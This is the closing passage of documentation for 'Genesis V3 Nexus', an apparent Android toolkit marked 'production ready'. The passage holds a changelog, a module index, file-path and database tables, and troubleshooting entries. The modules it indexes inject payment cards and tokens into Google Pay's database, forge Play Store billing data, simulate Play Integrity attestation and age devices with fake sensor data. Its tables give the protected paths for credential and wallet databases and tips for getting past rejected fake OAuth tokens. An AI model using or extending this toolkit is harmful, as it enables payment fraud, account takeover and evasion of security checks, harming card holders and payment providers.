- Synthetic OAuth tokens fail server validation
- Requires `sqlite3` binary on device (VMOS lacks this)
- Rapid commands cause 110031 cascade errors

## Genesis V1.0 — 2025-09

### Added
- Initial database injection framework
- Basic device aging
- VMOS Cloud compatibility layer
- File push via ADB

---

# Part 24: Master Index

## By Module

| Module | File | Key Classes/Functions |
|--------|------|----------------------|
| Google Master Auth | `core/google_master_auth.py` | `GoogleMasterAuth`, `AuthResult`, `authenticate()` |
| VMOS DB Builder | `core/vmos_db_builder.py` | `VMOSDBBuilder`, `CardData`, `generate_dpan()` |
| VMOS File Pusher | `core/vmos_file_pusher.py` | `VMOSFilePusher`, `build_coin_xml()` |
| Wallet Injection | `core/wallet_injection.py` | `GooglePayInjector`, `PaymentCard`, `CardNetwork` |
| Sensor Simulator | `core/sensor_noise_simulator.py` | `MEMSSensorSimulator`, `GPSSensorFusion` |
| Stochastic Aging | `core/stochastic_aging_engine.py` | `StochasticAgingEngine`, `create_aged_profile()` |
| Attestation Proxy | `core/attestation_proxy.py` | `VirtualKeyStore`, `PlayIntegritySimulator` |
| Nexus Runner | `core/vmos_nexus_runner.py` | `NexusRunner`, `NexusConfig`, `NexusResult` |
| VMOS Cloud API | `core/vmos_cloud_api.py` | `VMOSCloudClient`, `syncCmd()`, `switchRoot()` |

## By Database

| Database | Path | Schema Version | Key Tables |
|----------|------|----------------|------------|
| accounts_ce.db | `/data/system_ce/0/accounts_ce.db` | 10 | accounts, authtokens, extras |
| accounts_de.db | `/data/system_de/0/accounts_de.db` | 3 | accounts, authtokens |
| tapandpay.db | `/data/data/com.google.android.gms/databases/` | N/A | tokens, session_keys, transaction_history |
| library.db | `/data/data/com.android.vending/databases/` | N/A | ownership |

## By File Path

| Purpose | Absolute Path | Owner | Permissions |
|---------|--------------|-------|-------------|
| Account credentials | `/data/system_ce/0/accounts_ce.db` | system:system | 600 |
| Wallet tokens | `/data/data/com.google.android.gms/databases/tapandpay.db` | GMS UID | 660 |
| Play Store purchases | `/data/data/com.android.vending/databases/library.db` | Vending UID | 660 |
| Billing prefs | `/data/data/com.android.vending/shared_prefs/com.android.vending.billing.InAppBillingService.COIN.xml` | Vending UID | 660 |
| NFC prefs | `/data/data/com.google.android.apps.walletnfcrel/shared_prefs/nfc_on_prefs.xml` | Wallet UID | 660 |

## By Terminology

| Term | Definition | Section |
|------|------------|---------|
| DPAN | Device Primary Account Number | Glossary |
| Knox 0x1 | Samsung e-fuse tripped status | Glossary |
| LUK | Limited Use Key | Glossary, 14.1 |
| TSP | Token Service Provider | Glossary |
| VMOS | Virtual Machine Operating System | Glossary |

## By Error/Symptom

| Symptom | Cause | Solution | Section |
|---------|-------|----------|---------|
| "Sign in required" | Fake OAuth tokens | Use `google_master_auth.py` | 9.2 |
| Card not appearing | Missing VIEW/wrong perms | Create token_metadata VIEW | 9.4 |
| Status 110031 | Rate limit exceeded | Add 3s delay | 9.3 |
| Status 11 | Device bricked | Unrecoverable | 9.3 |
| Knox error | Samsung Pay on rooted | Impossible | 18.1 |

---

# Document Metrics

| Metric | Value |
|--------|-------|
| Total Parts | 24 |
| Total Lines | ~2,100+ |
| Code Examples | 50+ |
| API Endpoints Documented | 60+ |
| Database Schemas | 3 complete |
| XML Configurations | 4 complete |
| Troubleshooting Entries | 20+ |
| Glossary Terms | 50+ |
| FAQ Questions | 10 |
| First Created | 2026-03-29 |
| Last Updated | 2026-03-29 |
| Version | 3.0.4 (OBLIVION) |

---

*Genesis V3 Nexus Master Documentation — Complete*
**© 2026 Dva.12 / Titan Android Core**
**Status: PRODUCTION READY**
